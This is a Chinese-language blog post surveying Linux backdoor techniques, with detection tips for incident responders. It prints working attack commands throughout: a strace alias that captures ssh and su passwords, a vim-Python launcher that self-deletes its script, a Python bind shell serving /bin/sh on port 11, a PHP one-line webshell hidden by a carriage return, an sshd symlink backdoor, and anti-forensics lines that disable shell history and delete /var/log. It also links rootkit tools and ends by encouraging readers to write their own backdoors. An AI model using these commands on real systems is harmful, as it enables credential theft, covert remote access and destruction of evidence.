<h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><ul>
<li>最近遇到一些和后门相关的技术，所以就把之前的linux backdoor相关笔记重新整理和学习了一下。在这里做一下记录，后续有时间整理一下windows backdoor方面的技术。</li>
<li>在服务器被入侵后进行应急响应无非通过文件排查、网络排查、进程排查、系统信息排查等方法进行入侵排查。下面就一些常见技巧以及公开的工具进行剖析介绍。</li>
<li>当然现在有一些公司在发现入侵之后直接重装系统，那么基本所有的后门就无法发挥权限维持的作用了，但作为一个安全从业人员还是需要对一些后门有一个基本的了解。<h2 id="常见技巧"><a href="#常见技巧" class="headerlink" title="常见技巧"></a>常见技巧</h2><h3 id="strace记录ssh登录密码"><a href="#strace记录ssh登录密码" class="headerlink" title="strace记录ssh登录密码"></a>strace记录ssh登录密码</h3><pre><code>ssh=&apos;strace   -o   /tmp/sshpwd-`date    &apos;+%d%h%m%s&apos;`.log  \
-e read,write,connect  -s2048 ssh&apos;  
也可记录 su密码 su=&apos;strace   -o   /tmp/sshpwd-`date    &apos;+%d%h%m%s&apos;`.log  \
-e read,write,connect  -s2048 su&apos;
</code></pre><img src="sshkeyloger.png" alt=""></li>
<li>优点：改动较小</li>
<li>缺点：易被检测到</li>
<li>排查：通过排查shell的配置文件或者alias命令即可发现，例如~/.bashrc或~/.zshrc文件查看是否有恶意的alias问题。<h3 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h3><pre><code>#enter the mal script directory 、execute the script and then remove the script
cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py
</code></pre></li>
<li>此方法适用于安装了vim且安装了python扩展(绝大部分默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如python版本的正向后门监听11端口。<br>```<br>#from <a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html">https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a><br>from socket import *<br>import subprocess<br>import os, threading, sys, time</li>
</ul>
<p>if <strong>name</strong> == “<strong>main</strong>“:<br>        server=socket(AF_INET,SOCK_STREAM)<br>        server.bind((‘0.0.0.0’,11))<br>        server.listen(5)<br>        print ‘waiting for connect’<br>        talk, addr = server.accept()<br>        print ‘connect from’,addr<br>        proc = subprocess.Popen([“/bin/sh”,”-i”], stdin=talk,<br>                stdout=talk, stderr=talk, shell=True)</p>
<pre><code>![](vimversion.png)
* 优点：通过查看/proc/`id`/cmdline查看不到具体执行了什么命令或恶意脚本。
* 缺点：仍可以看到有vim进程
* 排查：检测对应vim进程号虚拟目录的map文件是否有python字眼。
* 参考文章[Weapons of Text Destruction.](https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf)
### 终端解析\r导致的问题
</code></pre><p>echo -e “&lt;?=`\$_POST[good]`?&gt;\r&lt;?=’PHP Test Page &gt;||&lt;                  ‘;?&gt;” &gt;/var/www/html/test.php</p>
<pre><code>![](echo.png)
![](terminal.png)
* 优点：通过终端命令例如cat、more等命令查看不到恶意代码,适合隐藏一句话木马。
* 缺点：易被检测，只是通过终端命令查看的时候看不到恶意代码，而通过其它读文件操作或者通过vim编辑的时候仍可以查看恶意代码。
* 排查：使用编辑器或者一般的webshell扫描工具即可检测。
### 一些命令导致truncated的问题
* 在使用ps进行进程查看的时候，不知道很多人会不会遇到这种问题，命令很长被截断的问题，终端显示有时候为了美观，可能会截断较长的命令，比如在使用docker ps -a查看container的时候，可能你的command列会显示不全，那么使用docker ps -a --no-trunc让其显示完全。同样在使用ps命令查看进程的时候，也存在这种问题。可以在其填充大量的空格进行截断，那么就可达到“进程隐藏”的效果。
![](pscommand.png)
* 其中使用了xhide工具[github地址](https://github.com/chenkaie/junkcode/blob/master/xhide.c)进行进程名的修改。
* 优点：简单
* 缺点：易被检测到
* 排查：通过ps -aux|grep 可疑进程的pid 即可显示完全，或者使用ps aux | less -+S、ps aux | cat或ps aux | most -w等命令进行查看。
### 常见sshd后门
* 一种是建立sshd的软连接方法，开启其它的端口例如
</code></pre><p>ln -sf /usr/sbin/sshd /home/su<br>/home/su -oport=2222</p>
<pre><code>* 优点：简单
* 缺点：易被检测到
* 排查：使用netstat -antlp查看可疑端口，然后ls -l 可执行文件即可。
![](lssshd.png)
* 另外一种就是通过在openssh源码中插入恶意代码重新编译并替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。
* 优点：隐蔽性较好
* 缺点：暂无
* 排查：这种sshd后门一般可能会有一定的特征，可以通过strings sshd |grep &apos;[1-9]{1,3}.[1-9]{1,3}.&apos;或者通过strace 查看是否有可疑的写文件操作。
### 定时任务和开机启动项
* 一般的挖矿木马喜欢设置定时任务来进行驻留或者进行分时段的挖矿。
![](crontab.png)
* 排查：一般通过crontab -l命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。
![](init.png)
### 预加载型动态链接库后门 ld.so.preload
* 可能有些人不太了解，简单说一下，就是我们在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生hijack。
![](strace.png)
* 如上图所示，strace 命令id的时候可以发现有预先去读取/etc/ld.so.preload文件(也可使用设置LD_PRELAOD环境变量方式)，如果我们将我们事先写好的恶意so文件位置写入ld.so.preload文件这个时候就会达到“劫持”的效果。
* 比较好用的工具是Vegile和cub3
[Vegile](https://github.com/Screetsec/Vegile/blob/master/Vegile#L112)
[cub3](https://github.com/mempodippy/cub3),这个工具使用了LD_PRELOAD和系统的扩展属性去隐藏文件。
* 更多参考：
[Linux文件系统扩展属性](http://www.drupal001.com/2013/02/linux-extended-attributes/)
* 其中还有一种是通过修改动态链接器来加载恶意动态链接库的后门，通过替换或者修改动态链接器中的默认预加载配置文件/etc/ld.so.preload路径的rootkit，此方法更加隐蔽，这个方法的较成熟的利用工具是Vlany，github地址https://github.com/mempodippy/vlany
[警惕利用Linux预加载型恶意动态链接库的后门](https://www.freebuf.com/column/162604.html)
* 优点：可以隐藏文件、网络、进程等。相对于普通用户空间rootkit而言，隐藏性较好，相对于内核模块rootkit来说，兼容性更好，编写难道低
* 缺点：暂无
* 排查：通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库。以及检查是否设置LD_PRELOAD环境变量等。
### 进程注入
* 使用ptrace向进程中注入恶意so文件工具linux-inject，[github地址](https://github.com/gaffe23/linux-inject/)
![](processinject.png)
![](evilso.png)
### 内核级rootkit
* 内核级的rootkit也很多，这里简单推荐一个Diamorphine
![](lkm.png)
[github地址](https://github.com/m0nad/Diamorphine)
* 优点：隐藏性较好
* 缺点：编写难度有点儿高
* 排查：可以通过unhide等工具进行排查
![](unhide.png)
###  antiForensics的技巧
</code></pre><h1 id="避免shell命令被记录"><a href="#避免shell命令被记录" class="headerlink" title="避免shell命令被记录"></a>避免shell命令被记录</h1><p>export HISTSIZE=0 &amp;&amp; export HISTFILE=/dev/null</p>
<h1 id="删除各种log信息，很暴力但确实很有效。"><a href="#删除各种log信息，很暴力但确实很有效。" class="headerlink" title="删除各种log信息，很暴力但确实很有效。"></a>删除各种log信息，很暴力但确实很有效。</h1><p>rm -rf /var/log<br>```</p>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><ul>
<li>以上介绍了几种backdoor的技巧，这里只是抛砖引玉，希望有更多人分享你的linux backdoor技巧、Write your own backdoor and MAKE BACKDOOR GREAT AGAIN : ）<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://github.com/d30sa1/RootKits-List-Download">linux rootkits</a><br><a href="https://github.com/mfontanini/Programs-Scripts/">https://github.com/mfontanini/Programs-Scripts/</a><br><a href="https://github.com/f0rb1dd3n/Reptile">Reptile</a><br><a href="https://github.com/inquisb/icmpsh">icmpsh</a><br><a href="https://isec.ne.jp/wp-content/uploads/2017/11/74LKM-rootkits-1.pdf">Diamorphine</a></li>
</ul>
